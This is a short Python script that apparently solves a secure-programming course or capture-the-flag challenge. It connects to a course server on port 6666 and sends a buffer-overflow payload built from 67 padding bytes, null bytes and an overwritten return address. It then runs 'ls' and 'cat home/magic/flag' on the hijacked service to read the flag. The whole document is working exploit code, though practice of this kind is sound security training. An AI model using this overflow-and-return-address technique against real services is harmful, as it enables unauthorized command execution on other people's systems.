import socket

SIZE = 10240

# connect
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c.connect(('secprog.cs.nctu.edu.tw', 6666))

# send/recv
print c.recv(SIZE)
c.send('hello\n')

print c.recv(SIZE)
msg = 'a'*67 + '\x00'*5 + '\x0e\x86\x04\x08\n' + 'ls\n'
c.send(msg)
print c.recv(SIZE)

c.send('cat home/magic/flag\n');
print c.recv(SIZE)
print c.recv(SIZE)
print c.recv(SIZE)

# close
c.close()

